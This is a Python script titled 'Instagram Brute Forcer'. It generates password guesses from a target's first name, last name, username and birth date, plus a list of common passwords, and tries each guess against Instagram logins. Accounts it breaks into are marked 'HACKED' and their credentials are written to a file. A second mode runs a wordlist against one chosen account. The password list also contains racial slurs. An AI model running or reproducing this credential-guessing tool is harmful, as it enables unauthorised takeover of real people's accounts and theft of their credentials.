import json
from os import system, _exit
from datetime import datetime
from colors import green, red, reset
from contextlib import redirect_stdout
from time import time, strftime, gmtime
hide = redirect_stdout(None)
with hide:
    from InstagramAPI import InstagramAPI

system('cls && title [Instagram Brute Forcer]')
option = str(input('[1] Use Accounts.json\n[2] Use Passwords.txt\n\n> Select an option: '))

if option in ['1', 'Accounts.json']:
    accounts = []
    hacked = 0
    print()

    with open('Accounts.json', 'r', encoding='UTF-8', errors='replace') as f:
        try:
            config = json.load(f)
            for user in config.values():
                accounts.append('%s %s %s %s' % (
                    user['username'], user['first_name'], user['last_name'], user['date_of_birth']
                ))
        except (KeyError, json.decoder.JSONDecodeError):
            print('> Invalid syntax in Accounts.json.')
            system('pause >NUL')
            _exit(0)

    for index, account in enumerate(accounts):
        account = account.split(' ')  # 0: johnsmith | 1: John | 2: Smith | 3: 010528

        passwords = []
        cleaned = []
        start = time()
        checked = 0

        year = account[3][:2]
        month = account[3][2:4]
        day = account[3][4:6]

        if int(year) <= 99 and int(year) >= int(str(datetime.now().year)[2:]):
            full_year = '19%s' % year
        else:
            full_year = '20%s' % year

        passwords.append(account[1] + full_year)
        passwords.append(account[1].upper() + full_year)
        passwords.append(account[1].lower() + full_year)

        passwords.append(account[2] + full_year)
        passwords.append(account[2].upper() + full_year)
        passwords.append(account[2].lower() + full_year)

        passwords.append(account[1] + account[2] + full_year)
        passwords.append(account[1].upper() + account[2].upper() + full_year)
        passwords.append(account[1].lower() + account[2].lower() + full_year)
        passwords.append(account[1].upper() + account[2].lower() + full_year)
        passwords.append(account[1].lower() + account[2].upper() + full_year)

        passwords.append(full_year + account[1] + account[2])
        passwords.append(full_year + account[1].upper() + account[2].upper())
        passwords.append(full_year + account[1].lower() + account[2].lower())
        passwords.append(full_year + account[1].upper() + account[2].lower())
        passwords.append(full_year + account[1].lower() + account[2].upper())

        passwords.append(account[2] + account[1] + full_year)
        passwords.append(account[2].upper() + account[1].upper() + full_year)
        passwords.append(account[2].lower() + account[1].lower() + full_year)
        passwords.append(account[2].upper() + account[1].lower() + full_year)
        passwords.append(account[2].lower() + account[1].upper() + full_year)

        passwords.append(full_year + account[2] + account[1])
        passwords.append(full_year + account[2].upper() + account[1].upper())
        passwords.append(full_year + account[2].lower() + account[1].lower())
        passwords.append(full_year + account[2].upper() + account[1].lower())
        passwords.append(full_year + account[2].lower() + account[1].upper())

        passwords.append(account[1] + full_year + account[2])
        passwords.append(account[1].upper() + full_year + account[2].upper())
        passwords.append(account[1].lower() + full_year + account[2].lower())
        passwords.append(account[1].upper() + full_year + account[2].lower())
        passwords.append(account[1].lower() + full_year + account[2].upper())

        passwords.append(account[2] + full_year + account[1])
        passwords.append(account[2].upper() + full_year + account[1].upper())
        passwords.append(account[2].lower() + full_year + account[1].lower())
        passwords.append(account[2].upper() + full_year + account[1].lower())
        passwords.append(account[2].lower() + full_year + account[1].upper())

        passwords.append(account[0].lower() + full_year)
        passwords.append(account[0].upper() + full_year)

        passwords.append(account[1] + year)
        passwords.append(account[1].upper() + year)
        passwords.append(account[1].lower() + year)

        passwords.append(account[2] + year)
        passwords.append(account[2].upper() + year)
        passwords.append(account[2].lower() + year)

        passwords.append(account[1] + account[2] + year)
        passwords.append(account[1].upper() + account[2].upper() + year)
        passwords.append(account[1].lower() + account[2].lower() + year)
        passwords.append(account[1].upper() + account[2].lower() + year)
        passwords.append(account[1].lower() + account[2].upper() + year)

        passwords.append(year + account[1] + account[2])
        passwords.append(year + account[1].upper() + account[2].upper())
        passwords.append(year + account[1].lower() + account[2].lower())
        passwords.append(year + account[1].upper() + account[2].lower())
        passwords.append(year + account[1].lower() + account[2].upper())

        passwords.append(account[2] + account[1] + year)
        passwords.append(account[2].upper() + account[1].upper() + year)
        passwords.append(account[2].lower() + account[1].lower() + year)
        passwords.append(account[2].upper() + account[1].lower() + year)
        passwords.append(account[2].lower() + account[1].upper() + year)

        passwords.append(year + account[2] + account[1])
        passwords.append(year + account[2].upper() + account[1].upper())
        passwords.append(year + account[2].lower() + account[1].lower())
        passwords.append(year + account[2].upper() + account[1].lower())
        passwords.append(year + account[2].lower() + account[1].upper())

        passwords.append(account[1] + year + account[2])
        passwords.append(account[1].upper() + year + account[2].upper())
        passwords.append(account[1].lower() + year + account[2].lower())
        passwords.append(account[1].upper() + year + account[2].lower())
        passwords.append(account[1].lower() + year + account[2].upper())

        passwords.append(account[2] + year + account[1])
        passwords.append(account[2].upper() + year + account[1].upper())
        passwords.append(account[2].lower() + year + account[1].lower())
        passwords.append(account[2].upper() + year + account[1].lower())
        passwords.append(account[2].lower() + year + account[1].upper())

        passwords.append(account[0].lower() + year)
        passwords.append(account[0].upper() + year)

        passwords.append(account[1] + account[3])
        passwords.append(account[1].upper() + account[3])
        passwords.append(account[1].lower() + account[3])

        passwords.append(account[2] + account[3])
        passwords.append(account[2].upper() + account[3])
        passwords.append(account[2].lower() + account[3])

        passwords.append(account[1] + account[2] + account[3])
        passwords.append(account[1].upper() + account[2].upper() + account[3])
        passwords.append(account[1].lower() + account[2].lower() + account[3])
        passwords.append(account[1].upper() + account[2].lower() + account[3])
        passwords.append(account[1].lower() + account[2].upper() + account[3])

        passwords.append(account[3] + account[1] + account[2])
        passwords.append(account[3] + account[1].upper() + account[2].upper())
        passwords.append(account[3] + account[1].lower() + account[2].lower())
        passwords.append(account[3] + account[1].upper() + account[2].lower())
        passwords.append(account[3] + account[1].lower() + account[2].upper())

        passwords.append(account[2] + account[1] + account[3])
        passwords.append(account[2].upper() + account[1].upper() + account[3])
        passwords.append(account[2].lower() + account[1].lower() + account[3])
        passwords.append(account[2].upper() + account[1].lower() + account[3])
        passwords.append(account[2].lower() + account[1].upper() + account[3])

        passwords.append(account[3] + account[2] + account[1])
        passwords.append(account[3] + account[2].upper() + account[1].upper())
        passwords.append(account[3] + account[2].lower() + account[1].lower())
        passwords.append(account[3] + account[2].upper() + account[1].lower())
        passwords.append(account[3] + account[2].lower() + account[1].upper())

        passwords.append(account[1] + account[3] + account[2])
        passwords.append(account[1].upper() + account[3] + account[2].upper())
        passwords.append(account[1].lower() + account[3] + account[2].lower())
        passwords.append(account[1].upper() + account[3] + account[2].lower())
        passwords.append(account[1].lower() + account[3] + account[2].upper())

        passwords.append(account[2] + account[3] + account[1])
        passwords.append(account[2].upper() + account[3] + account[1].upper())
        passwords.append(account[2].lower() + account[3] + account[1].lower())
        passwords.append(account[2].upper() + account[3] + account[1].lower())
        passwords.append(account[2].lower() + account[3] + account[1].upper())

        passwords.append(account[0].lower() + account[3])
        passwords.append(account[0].upper() + account[3])

        passwords.append(account[1] + month)
        passwords.append(account[1].upper() + month)
        passwords.append(account[1].lower() + month)

        passwords.append(account[2] + month)
        passwords.append(account[2].upper() + month)
        passwords.append(account[2].lower() + month)

        passwords.append(account[1] + account[2] + month)
        passwords.append(account[1].upper() + account[2].upper() + month)
        passwords.append(account[1].lower() + account[2].lower() + month)
        passwords.append(account[1].upper() + account[2].lower() + month)
        passwords.append(account[1].lower() + account[2].upper() + month)

        passwords.append(month + account[1] + account[2])
        passwords.append(month + account[1].upper() + account[2].upper())
        passwords.append(month + account[1].lower() + account[2].lower())
        passwords.append(month + account[1].upper() + account[2].lower())
        passwords.append(month + account[1].lower() + account[2].upper())

        passwords.append(account[2] + account[1] + month)
        passwords.append(account[2].upper() + account[1].upper() + month)
        passwords.append(account[2].lower() + account[1].lower() + month)
        passwords.append(account[2].upper() + account[1].lower() + month)
        passwords.append(account[2].lower() + account[1].upper() + month)

        passwords.append(month + account[2] + account[1])
        passwords.append(month + account[2].upper() + account[1].upper())
        passwords.append(month + account[2].lower() + account[1].lower())
        passwords.append(month + account[2].upper() + account[1].lower())
        passwords.append(month + account[2].lower() + account[1].upper())

        passwords.append(account[1] + month + account[2])
        passwords.append(account[1].upper() + month + account[2].upper())
        passwords.append(account[1].lower() + month + account[2].lower())
        passwords.append(account[1].upper() + month + account[2].lower())
        passwords.append(account[1].lower() + month + account[2].upper())

        passwords.append(account[2] + month + account[1])
        passwords.append(account[2].upper() + month + account[1].upper())
        passwords.append(account[2].lower() + month + account[1].lower())
        passwords.append(account[2].upper() + month + account[1].lower())
        passwords.append(account[2].lower() + month + account[1].upper())

        passwords.append(account[0].lower() + month)
        passwords.append(account[0].upper() + month)

        passwords.append(account[1] + day)
        passwords.append(account[1].upper() + day)
        passwords.append(account[1].lower() + day)

        passwords.append(account[2] + day)
        passwords.append(account[2].upper() + day)
        passwords.append(account[2].lower() + day)

        passwords.append(account[1] + account[2] + day)
        passwords.append(account[1].upper() + account[2].upper() + day)
        passwords.append(account[1].lower() + account[2].lower() + day)
        passwords.append(account[1].upper() + account[2].lower() + day)
        passwords.append(account[1].lower() + account[2].upper() + day)

        passwords.append(day + account[1] + account[2])
        passwords.append(day + account[1].upper() + account[2].upper())
        passwords.append(day + account[1].lower() + account[2].lower())
        passwords.append(day + account[1].upper() + account[2].lower())
        passwords.append(day + account[1].lower() + account[2].upper())

        passwords.append(account[2] + account[1] + day)
        passwords.append(account[2].upper() + account[1].upper() + day)
        passwords.append(account[2].lower() + account[1].lower() + day)
        passwords.append(account[2].upper() + account[1].lower() + day)
        passwords.append(account[2].lower() + account[1].upper() + day)

        passwords.append(day + account[2] + account[1])
        passwords.append(day + account[2].upper() + account[1].upper())
        passwords.append(day + account[2].lower() + account[1].lower())
        passwords.append(day + account[2].upper() + account[1].lower())
        passwords.append(day + account[2].lower() + account[1].upper())

        passwords.append(account[1] + day + account[2])
        passwords.append(account[1].upper() + day + account[2].upper())
        passwords.append(account[1].lower() + day + account[2].lower())
        passwords.append(account[1].upper() + day + account[2].lower())
        passwords.append(account[1].lower() + day + account[2].upper())

        passwords.append(account[2] + day + account[1])
        passwords.append(account[2].upper() + day + account[1].upper())
        passwords.append(account[2].lower() + day + account[1].lower())
        passwords.append(account[2].upper() + day + account[1].lower())
        passwords.append(account[2].lower() + day + account[1].upper())

        passwords.append(account[0].lower() + day)
        passwords.append(account[0].upper() + day)

        passwords.append(account[1])
        passwords.append(account[2])
        passwords.append(account[1].lower())
        passwords.append(account[2].lower())
        passwords.append(account[0])
        passwords.append(account[0].upper())

        passwords.append(account[0] + '123')
        passwords.append(account[0].upper() + '123')
        passwords.append(account[1] + '123')
        passwords.append(account[1].lower() + '123')
        passwords.append(account[1].upper() + '123')
        passwords.append(account[2] + '123')
        passwords.append(account[2].lower() + '123')
        passwords.append(account[2].upper() + '123')

        passwords.append('123' + account[0])
        passwords.append('123' + account[0].upper())
        passwords.append('123' + account[1])
        passwords.append('123' + account[1].lower())
        passwords.append('123' + account[1].upper())
        passwords.append('123' + account[2])
        passwords.append('123' + account[2].lower())
        passwords.append('123' + account[2].upper())

        passwords.append('qwerty123')
        passwords.append('123456')
        passwords.append('1234567')
        passwords.append('12345678')
        passwords.append('123456789')
        passwords.append('1234567890')
        passwords.append('qwerty')
        passwords.append('qwertyuiop')
        passwords.append('password')
        passwords.append('Password')
        passwords.append('passw0rd')
        passwords.append('Passw0rd')
        passwords.append('Password1')
        passwords.append('password1')
        passwords.append('iloveyou')
        passwords.append('ILOVEYOU')
        passwords.append('111111')
        passwords.append('123123')
        passwords.append('Nothing')
        passwords.append('nothing')
        passwords.append('Secret')
        passwords.append('Admin')
        passwords.append('abc123')
        passwords.append('monkey')
        passwords.append('dragon')
        passwords.append('baseball')
        passwords.append('master')
        passwords.append('sunshine')
        passwords.append('ashley')
        passwords.append('bailey')
        passwords.append('shadow')
        passwords.append('superman')
        passwords.append('Football')
        passwords.append('football')
        passwords.append('cristiano')
        passwords.append('cristiano7')
        passwords.append('ronaldo7')
        passwords.append('cristianoronaldo')
        passwords.append('cristianoronaldo7')
        passwords.append('ronaldocristiano')
        passwords.append('ronaldocristiano7')
        passwords.append('instagram123')
        passwords.append('google')
        passwords.append('yourmom')
        passwords.append('nigger123')
        passwords.append('nigga123')
        passwords.append('hello123')
        passwords.append('hello1337')

        for password in passwords:
            if password not in cleaned:
                cleaned.append(password)

        for password in cleaned:
            api = InstagramAPI(account[0], password)
            with hide:
                logged_in = api.login()

            if logged_in:
                hacked += 1
                checked += 1
                system('title [Instagram Brute Forcer] - '
                       'Checking: @%s (%s/%s) ^| Attempting Password: %s ^| Checked: %s%% ^| '
                       'Time Remaining: 00:00:00 ^| Hacked: %s' % (
                           account[0], index + 1, len(accounts), password,
                           round(((checked / len(cleaned)) * 100), 3), hacked))

                api.getSelfUsernameInfo()
                result = api.LastJson
                user_id = result['user']['pk']
                username = result['user']['username']
                followers = result['user']['follower_count']

                print('%s[%sHACKED%s] %s%s:%s %s| '
                      '%sUsername: %s %s| %sUser ID: %s %s| %sFollowers: %s' % (
                          green(), reset(), green(), reset(), account[0], password, green(),
                          reset(), username, green(), reset(), user_id, green(), reset(),
                          followers))
                with open('Saved.txt', 'a', encoding='UTF-8', errors='replace') as f:
                    f.write('Username: %s | Password: %s | Followers: %s | User ID: %s\n' % (
                        username, password, followers, user_id)
                    )
                break
            else:
                checked += 1
                time_remaining = strftime(
                    '%H:%M:%S', gmtime((time() - start) / checked * (len(cleaned) - checked))
                )
                system('title [Instagram Brute Forcer] - '
                       'Checking: @%s (%s/%s) ^| Attempting Password: %s ^| Checked: %s%% ^| '
                       'Time Remaining: %s ^| Hacked: %s' % (
                           account[0], index + 1, len(accounts), password,
                           round(((checked / len(cleaned)) * 100), 3), time_remaining, hacked))
        else:
            print('%s[%sFAILED%s] %s%s' % (red(), reset(), red(), reset(), account[0]))

    system('title [Instagram Brute Forcer] - '
           'Checking: @%s (%s/%s) ^| Checked: %s%% ^| '
           'Time Remaining: 00:00:00 ^| Hacked: %s' % (
               account[0], index + 1, len(accounts),
               round(((checked / len(cleaned)) * 100), 3), hacked))
    print('\n> Finished.')
    system('pause >NUL')

elif option in ['2', 'Passwords.txt']:
    passwords = []
    cleaned = []
    start = time()
    checked = 0
    hacked = False

    with open('Passwords.txt', 'r', encoding='UTF-8', errors='replace') as f:
        for line in f.read().splitlines():
            passwords.append(line)

    for password in passwords:
        if password not in cleaned:
            cleaned.append(password)

    target = str(input('> Target: @'))
    print()

    for password in cleaned:
        api = InstagramAPI(target, password)
        with hide:
            logged_in = api.login()

        if logged_in:
            hacked = True
            checked += 1
            system('title [Instagram Brute Forcer] - '
                   'Checking: @%s ^| Attempting Password: %s ^| Checked: %s%% ^| '
                   'Time Remaining: 00:00:00 ^| Hacked: %s' % (
                       target, password,
                       round(((checked / len(cleaned)) * 100), 3), hacked))

            api.getSelfUsernameInfo()
            result = api.LastJson
            user_id = result['user']['pk']
            username = result['user']['username']
            followers = result['user']['follower_count']

            print('%s[%sHACKED%s] %s%s:%s %s| '
                  '%sUsername: %s %s| %sUser ID: %s %s| %sFollowers: %s' % (
                      green(), reset(), green(), reset(), target, password, green(),
                      reset(), username, green(), reset(), user_id, green(), reset(),
                      followers))
            with open('Saved.txt', 'a', encoding='UTF-8', errors='replace') as f:
                f.write('Username: %s | Password: %s | Followers: %s | User ID: %s\n' % (
                    username, password, followers, user_id)
                )
            break
        else:
            checked += 1
            time_remaining = strftime(
                '%H:%M:%S', gmtime((time() - start) / checked * (len(cleaned) - checked))
            )
            system('title [Instagram Brute Forcer] - '
                   'Checking: @%s ^| Attempting Password: %s ^| Checked: %s%% ^| '
                   'Time Remaining: %s ^| Hacked: %s' % (
                       target, password,
                       round(((checked / len(cleaned)) * 100), 3), time_remaining, hacked))
    else:
        print('%s[%sFAILED%s] %s%s' % (red(), reset(), red(), reset(), target))

    system('title [Instagram Brute Forcer] - '
           'Checking: @%s ^| Checked: %s%% ^| Hacked: %s' % (
               target,
               round(((checked / len(cleaned)) * 100), 3), hacked))
    print('\n> Finished.')
    system('pause >NUL')

else:
    print('\n> Invalid option.')
    system('pause >NUL')
